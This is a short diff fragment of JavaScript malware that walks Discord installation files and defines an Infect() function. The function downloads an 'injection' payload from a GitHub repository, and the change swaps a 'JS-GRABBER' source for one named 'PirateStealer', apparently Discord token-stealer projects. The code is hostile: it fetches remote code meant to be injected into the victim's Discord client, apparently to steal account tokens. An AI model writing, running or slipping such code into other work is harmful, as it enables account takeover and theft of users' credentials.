@@ -25,7 +25,7 @@ discords.forEach(function(file) {
     })
 });
 function Infect() {
-    https.get('https://raw.githubusercontent.com/Scars1337x/JS-GRABBER/main/injection', (resp) => {
+    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/Injection/injection', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
